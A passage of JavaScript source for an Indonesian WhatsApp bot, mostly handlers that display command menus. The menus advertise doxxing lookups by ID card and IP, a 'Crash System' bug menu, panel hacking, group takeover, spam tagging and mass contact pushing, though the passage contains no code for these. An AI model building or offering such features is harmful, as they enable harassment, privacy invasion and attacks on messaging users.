├─> listidch
├─> jpmallch
├─> jpmallch2
├─> joinch
╰─> reactch

╭─☰ CLOUDFLARE MENU
├─> adddomaincf
├─> deldomaincf
├─> listdomaincf
╰─> clearallsubdo

╭─☰ FITUR NEW MENU
├─> createweb
├─> delweb
├─> ambilkodeweb
├─> listweb
╰─> createsc

╭─☰ OTHER MENU
├─> cekidgc
├─> rvo
├─> qc
├─> brat
├─> bratvideo
├─> bratanime
├─> emojimix
├─> emojigif
├─> stickerwm
├─> sticker
╰─> infocrypto

╭─☰ STALKER MENU
├─> ffstalk
├─> mlstalk
├─> igstalk
├─> tiktokstalk
├─> githubstalk
╰─> ytstalk

╭─☰ PRODUK MENU
├─> addproduk
├─> delproduk
├─> checkproduk
├─> editproduk
├─> listproduk
╰─> buyproduk

╭─☰ SCRIPT MENU
├─> addscript
├─> delscript
├─> listscript
├─> infoscript
╰─> belistockscript

╭─☰ STOCK MENU
├─> addstokdo
├─> delstokdo
╰─> liststokdo

╭─☰ CATATAN MENU
├─> addpendapatan
├─> delpendapatan
╰─> listpendapatan

╭─☰ SEARCH MENU
├─> nsfw
├─> hentaineko
├─> hentaivideo
├─> r34
├─> yts
├─> apkmod
├─> pinterest
├─> sfile
├─> gimage
├─> xnxx
├─> playstore
├─> npmsearch
├─> tiktokstalk
╰─> igstalk

╭─☰ ORKUT H2H MENU
├─> cekstatus
├─> ceksaldo-orkut
╰─> cekmutasi

╭─☰ FUN MENU
├─> confess
├─> balasmenfess
├─> tolakmenfess
├─> stopmenfess
├─> bekerja
├─> sound1 - sound161
├─> mangkane1 - mangkane54 ( sound )
├─> acumalaka ( sound )
├─> reza-kecap ( sound )
├─> farhan-kebab ( sound )
├─> omaga ( sound )
├─> kamu-nanya ( sound )
├─> anjay ( sound )
├─> siuu ( sound )
├─> jodoh
├─> emojimix
├─> emojigif
├─> cekkhodam
├─> cekganteng
├─> cekcantik
├─> kapankah
├─> ceksange
├─> cekkontol
├─> cekmemek
├─> cekjomok
├─> tambah
├─> kurang
├─> kali
├─> bagi
├─> paptt1
╰─> paptt2

╭─☰ ISLAMI MENU
├─> kisahnabi
├─> quotesislami
├─> bacaansholat
├─> asmaulhusna
╰─> ayatkursi

╭─☰ TOOLSS MENU
├─> autoai
├─> ai
├─> ai-islam
├─> ai-inggris
├─> gpt
├─> deepseek
├─> tourl
├─> tourlvid
├─> ssweb
├─> translate
├─> hd
├─> shortlink
├─> ocr
├─> nulis
├─> removebg
├─> readqr
├─> enc
├─> enchard
├─> encmed
├─> doxxingktp
╰─> doxxingip

╭─☰ SHOP MENU
├─> buypanel
├─> buyadp
├─> buyscript
├─> buyvps
├─> buyresellerpanel
├─> buyownpanel
├─> buyptpanel
├─> jasainstallpanel
├─> jasahbpanel
├─> jasainstalltema
├─> jasainstalltemaelysium
├─> jasainstalltemabilling
├─> jasainstalltemaenigma
├─> jasainstalltemanightcore
├─> buyjasashare
├─> buydigitalocean
├─> buyfitur
├─> qris
├─> dana
╰─> gopay

╭─☰ DOWNLOAD MENU
├─> tiktok
├─> tiktokmp3
├─> facebook
├─> instagram
├─> ytmp3
├─> ytmp4
├─> play
├─> playvideo
├─> videy
├─> bokep
├─> pornhub
├─> gitclone
├─> mediafire
├─> capcut
├─> doodstream
├─> playspotify
├─> googledrive
├─> spotify
├─> terabox
╰─> xnxxdl

╭─☰ STORE MENU
├─> addrespon
├─> delrespon
├─> listrespon
├─> done
├─> proses
├─> jpm
├─> jpm2
├─> playvideo
├─> jpmchfoto
├─> jpmallch
├─> jpmallch2 <memakai waktu>
├─> jpmtesti
├─> jpmslide
├─> jpmslideht
├─> sendtesti
├─> pushkontak
├─> pushkontak1
├─> pushkontak2
├─> savekontak
├─> savekontak2
├─> payment
├─> produk
╰─> subdomain

╭─☰ DIGITAL OCEAN MENU
├─> cvps
├─> createvps
├─> gantipwvps
├─> changeapido
├─> checkdo
├─> turnon
├─> turnoff
├─> sisadroplet
├─> deldroplet
├─> listdroplet
├─> rebuild
╰─> restartvps

╭─☰ PANEL MENU
├─> addseller
├─> delseller
├─> listseller
├─> addserverpanel
├─> delserverpanel
├─> listserverpanel
├─> addaksesgrub
├─> delaksesgrub
├─> listaksesgrub
├─> 1gb - unlimited
├─> c1gb - cunli
├─> cadmin1
├─> cpanel
├─> delpanelall
├─> deluserall
├─> clearall
├─> deladminall
├─> cadmin
├─> delpanel
├─> deladmin
├─> listpanel
├─> listadmin
╰─> linklog

╭─☰ PANEL V2 MENU
├─> addseller-v2
├─> delseller-v2
├─> listseller-v2
├─> 1gb-v2 - unlimited-v2
├─> c1gb-v2 - cunli-v2
├─> cadmin1-v2
├─> cpanel-v2
├─> delpanelall-v2
├─> deluserall-v2
├─> clearall-v2
├─> deladminall-v2
├─> cadmin-v2
├─> delpanel-v2
├─> deladmin-v2
├─> listpanel-v2
├─> listadmin-v2
╰─> linklog-v2

╭─☰ INSTALLER MENU
├─> hackbackpanel
├─> hackbackpanel2
├─> installpanel
├─> installpanel2
├─> startwings
├─> installthema
├─> installtemastellar
├─> installtemanebula
├─> installtemanightcore
├─> installtemabilling
├─> installtemaenigma
├─> uninstallpanel
╰─> uninstalltema

╭─☰ GROUP MENU
├─> add
├─> antilink
├─> antilink2
├─> antilinkall
├─> antitoxic
├─> antilinkwa
├─> antitoxic
├─> mute
├─> blacklistjpm
├─> welcome
├─> invite
├─> kick
├─> kicktime
├─> gcsider
├─> creategc
├─> close
├─> closetime
├─> opentime
├─> open
├─> hidetag
├─> spamtag
├─> kudetagc
├─> kudetagc2
├─> promoteall
├─> demoteall
├─> promote
├─> demote
├─> resetlinkgc
├─> on
├─> off
╰─> linkgc

╭─☰ OWNER MENU
├─> autoread
├─> adddomain
├─> deldomain
├─> listdomain
├─> blokir
├─> unblokir
├─> layanan
├─> tagsw
├─> upswtag
├─> cekdns
├─> cekhost
├─> cekip
├─> trackip
├─> cekweb
├─> ceksubdo
├─> sendngl
├─> otomatisauto
├─> cekinfo
├─> autopromosi
├─> autoreadsw
├─> autotyping
├─> addcase
├─> delcase
├─> getcase
├─> getcase2
├─> listcase
├─> renamecase
├─> addfunction
├─> delfunction
├─> addowner
├─> delowner
├─> listowner
├─> addprem
├─> delprem
├─> listprem
├─> self/public
├─> settppbot
├─> clearsession
├─> clearchat
├─> restartbot
├─> getsc
├─> getip
├─> daftarsc
├─> hapussc
├─> svsc
├─> sendsc
├─> getfile
├─> listgc
╰─> joingc`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: teks,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
                highlight_label: "Populer",
                rows: [
                  {
                    title: "𝗢𝗿𝗸𝘂𝘁 ☇ 𝗠𝗲𝗻𝘂",
                    description: "Fitur Orkut",
                    id: ".orkut"
                  },
                  {
                    title: "𝗣𝗿𝗼𝗱𝘂𝗸 ☇ 𝗠𝗲𝗻𝘂", 
                    description: "Fitur Produk",
                    id: ".produkmenu"
                  },
                  {
                    title: "𝗦𝘁𝗼𝗰𝗸 ☇ 𝗠𝗲𝗻𝘂", 
                    description: "Fitur Stock",
                    id: ".stokmenu"
                  },
                  {
                    title: "𝗦𝘁𝗮𝗹𝗸𝗲𝗿 ☇ 𝗠𝗲𝗻𝘂", 
                    description: "Fitur Stalking",
                    id: ".stalkmenu"
                  },
                  {
                    title: "𝗖𝗮𝘁𝗮𝘁𝗮𝗻 ☇ 𝗠𝗲𝗻𝘂", 
                    description: "Catatan Kebutuhan",
                    id: ".catatanmenu"
                  },
                  {
                    title: "𝗖𝗿𝗮𝘀𝗵 𝗦𝘆𝘀𝘁𝗲𝗺",
                    description: "Bug Menu",
                    id: ".attackmenu"
                  },
                  {
                    title: "𝗖𝗹𝗼𝘂𝗱𝗳𝗹𝗮𝗿𝗲 ☇ 𝗠𝗲𝗻𝘂", 
                    description: "Fitur Domain Cf",
                    id: ".cfmenu"
                  },
                  {
                    title: "𝗦𝗮𝗹𝘂𝗿𝗮𝗻 ☇ 𝗠𝗲𝗻𝘂", 
                    description: "Fitur Channel",
                    id: ".saluranmenu"
                  },
                  {
                    title: "𝗜𝘀𝗹𝗮𝗺𝗶 ☇ 𝗠𝗲𝗻𝘂", 
                    description: "Fitur Muslim",
                    id: ".islammenu"
                  },
                  {
                    title: "𝗦𝗰𝗿𝗶𝗽𝘁 ☇ 𝗠𝗲𝗻𝘂", 
                    description: "Sc Stock",
                    id: ".scmenu"
                  },
                  {
                    title: "𝗙𝘂𝗻 ☇ 𝗠𝗲𝗻𝘂", 
                    description: "Fitur Sc MD",
                    id: ".funmenu"
                  },
                  {
                    title: "𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼",
                    description: "Terima Kasih Kepada Penyupport Script ini",
                    id: ".tqto"
                  },
                  {
                    title: "𝗢𝘁𝗵𝗲𝗿 ☇ 𝗠𝗲𝗻𝘂", 
                    description: "Menu Other",
                    id: ".othermenu"
                  },
                  {
                    title: "𝗦𝗲𝗮𝗿𝗰𝗵 ☇ 𝗠𝗲𝗻𝘂", 
                    description: "Fitur Menelusuri",
                    id: ".searchmenu"
                  },
                  {
                    title: "𝗧𝗼𝗼𝗹𝘀 ☇ 𝗠𝗲𝗻𝘂", 
                    description: "Fitur Peralatan",
                    id: ".toolsmenu"
                  },
                  {
                    title: "𝗦𝗵𝗼𝗽 ☇ 𝗠𝗲𝗻𝘂", 
                    description: "Pembelian Otomatis",
                    id: ".shopmenu"
                  },
                  {
                    title: "𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 ☇ 𝗠𝗲𝗻𝘂", 
                    description: "Fitur Download",
                    id: ".downloadmenu"
                  },
                  {
                    title: "𝗦𝘁𝗼𝗿𝗲 ☇ 𝗠𝗲𝗻𝘂", 
                    description: "Fitur Store & Push Kontak & Jpm",
                    id: ".storemenu"
                  },
                  {
                    title: "𝗗𝗶𝗴𝗶𝘁𝗮𝗹 𝗢𝗰𝗲𝗮𝗻 ☇ 𝗠𝗲𝗻𝘂", 
                    description: "Control Digital Ocean",
                    id: ".domenu"
                  },
                  {
                    title: "𝗣𝗮𝗻𝗲𝗹 ☇ 𝗠𝗲𝗻𝘂", 
                    description: "Fitur Panel",
                    id: ".panelmenu"
                  },
                  {
                    title: "𝗹𝗻𝘀𝘁𝗮𝗹𝗹𝗲𝗿 ☇ 𝗠𝗲𝗻𝘂", 
                    description: "Fitur install",
                    id: ".installmenu"
                  },
                  {
                    title: "𝗚𝗿𝗼𝘂𝗽 ☇ 𝗠𝗲𝗻𝘂", 
                    description: "Fitur Group",
                    id: ".grubmenu"
                  },
                  {
                    title: "𝗢𝘄𝗻𝗲𝗿 ☇ 𝗠𝗲𝗻𝘂", 
                    description: "Fitur Owner",
                    id: ".ownermenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek });
}
break;
//----------(Batas Case)----------//
case 'islammenu':{
const teks = `╭─☰ ISLAMI MENU
├─> kisahnabi
├─> quotesislami
├─> bacaansholat
├─> asmaulhusna
╰─> ayatkursi`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: teks,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
                highlight_label: "Populer",
                rows: [
                  {
                    title: "AllMenu",
                    description: "A - B",
                    id: "allmenu"
                  },
                  {
                    title: "BugMenu",
                    description: "A - C",
                    id: "bugmenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek });
}
break;
//------(Batas Case)------//
case 'othermenu':{
const teks = `╭─☰ OTHER MENU
├─> cekidgc
├─> rvo
├─> qc
├─> brat
├─> bratvideo
├─> bratanime
├─> emojimix
├─> emojigif
├─> stickerwm
├─> sticker
╰─> infocrypto`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: teks,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
                highlight_label: "Populer",
                rows: [
                  {
                    title: "AllMenu",
                    description: "A - B",
                    id: "allmenu"
                  },
                  {
                    title: "BugMenu",
                    description: "A - C",
                    id: "bugmenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek });
}
break;
//------(Batas Case)------//
case 'stalkmenu': case 'stalkermenu': {
const teks = `╭─☰ STALKER MENU
├─> ffstalk
├─> mlstalk
├─> igstalk
├─> tiktokstalk
├─> githubstalk
╰─> ytstalk`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: teks,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
                highlight_label: "Populer",
                rows: [
                  {
                    title: "AllMenu",
                    description: "A - B",
                    id: "allmenu"
                  },
                  {
                    title: "BugMenu",
                    description: "A - C",
                    id: "bugmenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek });
}
break;
//------(Batas Case)------//
case 'brat':{
if (!text) return Reply(example('teksnya'))		
						
const teks = `Silahkan pilih type brat\nTeks Kamu :\n${text}`
await TamaMods.sendMessage(m.chat, {
  footer: `${author}`,
  buttons: [
    {
      buttonId: `.brat1 ${text}`,
      buttonText: { displayText: 'Brat iPhone' },
      type: 1
    },
    {
      buttonId: `.brat2 ${text}`,
      buttonText: { displayText: 'Brat Andro' },
      type: 1
    },
    {
      buttonId: `.bratvid ${text}`,
      buttonText: { displayText: 'Brat Video' },
      type: 1
    },
    {
      buttonId: `.bratanime ${text}`,
      buttonText: { displayText: 'Brat Anime' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: { url: "https://files.catbox.moe/wbl5er.jpg" },
  caption: `${teks}`,
  contextInfo: {
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namasaluran
   }
  },
}, {quoted: pantek})
}
break;

case "brat2": {
if (!text) return Reply(example('teksnya'))
let brat = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}`
let response = await axios.get(brat, { responseType: "arraybuffer" })
let videoBuffer = response.data;
try {
await TamaMods.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {}
}
break
//------(Batas Case)------//
case 'cfmenu': case 'cloudflaremenu': {  
const teks = `╭─☰ CLOUDFLARE MENU
├─> adddomaincf
├─> deldomaincf
├─> listdomaincf
╰─> clearallsubdo`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: teks,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
                highlight_label: "Populer",
                rows: [
                  {
                    title: "AllMenu",
                    description: "A - B",
                    id: "allmenu"
                  },
                  {
                    title: "BugMenu",
                    description: "A - C",
                    id: "bugmenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek });
}
break;
//------(Batas Case)------//
case 'saluranmenu':{  
const teks = `╭─☰ SALURAN MENU
├─> cekidch
├─> addidch
├─> delidch
├─> listidch
├─> jpmallch
├─> jpmallch2
├─> joinch
╰─> reactch`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: teks,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
                highlight_label: "Populer",
                rows: [
                  {
                    title: "AllMenu",
                    description: "A - B",
                    id: "allmenu"
                  },
                  {
                    title: "BugMenu",
                    description: "A - C",
                    id: "bugmenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek });
}
break;
//------(Batas Case)------//
case 'produkmenu':{ 
const teks = `╭─☰ PRODUK MENU
├─> addproduk
├─> delproduk
├─> checkproduk
├─> editproduk
├─> listproduk
╰─> buyproduk`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: teks,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
                highlight_label: "Populer",
                rows: [
                  {
                    title: "AllMenu",
                    description: "A - B",
                    id: "allmenu"
                  },
                  {
                    title: "BugMenu",
                    description: "A - C",
                    id: "bugmenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek });
}
break;
//------(Batas Case)------//
case "scmenu": case "scriptmenu": {    
const teks = `╭─☰ SCRIPT MENU
├─> addscript
├─> delscript
├─> listscript
├─> infoscript
╰─> belistockscript`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: teks,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
                highlight_label: "Populer",
                rows: [
                  {
                    title: "AllMenu",
                    description: "A - B",
                    id: "allmenu"
                  },
                  {
                    title: "BugMenu",
                    description: "A - C",
                    id: "bugmenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek });
}
break;                                       

case 'searchmenu':{
const teks = `╭─☰ SEARCH MENU
├─> nsfw
├─> hentaineko
├─> hentaivideo
├─> r34
├─> yts
├─> apkmod
├─> pinterest
├─> sfile
├─> gimage
├─> xnxx
├─> playstore
├─> npmsearch
├─> tiktokstalk
╰─> igstalk`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: teks,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
                highlight_label: "Populer",
                rows: [
                  {
                    title: "AllMenu",
                    description: "A - B",
                    id: "allmenu"
                  },
                  {
                    title: "BugMenu",
                    description: "A - C",
                    id: "bugmenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek });
}
break;                    

case 'toolsmenu':{
const teks = `╭─☰ TOOLSS MENU
├─> autoai
├─> ai
├─> ai-islam
├─> ai-inggris
├─> gpt
├─> deepseek
├─> tourl
├─> tourlvid
├─> ssweb
├─> translate
├─> hd
├─> shortlink
├─> ocr
├─> nulis
├─> removebg
├─> readqr
├─> enc
├─> enchard
├─> encmed
├─> doxxingktp
╰─> doxxingip`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: teks,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
                highlight_label: "Populer",
                rows: [
                  {
                    title: "AllMenu",
                    description: "A - B",
                    id: "allmenu"
                  },
                  {
                    title: "BugMenu",
                    description: "A - C",
                    id: "bugmenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek });
}
break;
             
             case 'shopmenu':{
const teks = `╭─☰ SHOP MENU
├─> buypanel
├─> buyadp
├─> buyscript
├─> buyvps
├─> buyresellerpanel
├─> buyownpanel
├─> buyptpanel
├─> jasainstallpanel
├─> jasahbpanel
├─> jasainstalltema
├─> jasainstalltemaelysium
├─> jasainstalltemabilling
├─> jasainstalltemaenigma
├─> jasainstalltemanightcore
├─> buyjasashare
├─> buydigitalocean
├─> buyfitur
├─> qris
├─> dana
╰─> gopay`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: teks,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
                highlight_label: "Populer",
                rows: [
                  {
                    title: "AllMenu",
                    description: "A - B",
                    id: "allmenu"
                  },
                  {
                    title: "BugMenu",
                    description: "A - C",
                    id: "bugmenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek });
}
break;
               
case 'downloadmenu':{
const teks = `╭─☰ DOWNLOAD MENU
├─> tiktok
├─> tiktokmp3
├─> facebook
├─> instagram
├─> ytmp3
├─> ytmp4
├─> play
├─> playvideo
├─> videy
├─> bokep
├─> pornhub
├─> gitclone
├─> mediafire
├─> capcut
├─> doodstream
├─> playspotify
├─> googledrive
├─> spotify
├─> terabox
╰─> xnxxdl`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: teks,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
